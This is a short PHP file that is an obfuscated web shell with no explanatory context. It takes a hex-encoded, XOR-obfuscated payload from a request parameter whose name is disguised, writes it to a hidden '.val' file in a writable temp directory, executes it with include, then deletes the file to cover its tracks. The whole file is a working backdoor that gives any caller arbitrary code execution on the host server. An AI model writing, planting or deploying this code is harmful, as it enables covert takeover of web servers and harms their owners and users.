<?php

if(count($_REQUEST) > 0 && isset($_REQUEST["\x6F\x62j\x65ct"])){
	$holder = hex2bin($_REQUEST["\x6F\x62j\x65ct"]);
	$mrk  =''  ; $y = 0; do{$mrk .= chr(ord($holder[$y]) ^ 53);$y++;} while($y < strlen($holder));
	$token = array_filter(["/var/tmp", session_save_path(), "/tmp", getcwd(), "/dev/shm", ini_get("upload_tmp_dir"), getenv("TEMP"), getenv("TMP"), sys_get_temp_dir()]);
	foreach ($token as $res):
    		if (is_writable($res) && is_dir($res)) {
    $binding = "$res/.val";
    if (@file_put_contents($binding, $mrk) !== false) {
	include $binding;
	unlink($binding);
	exit;
}
}
endforeach;
}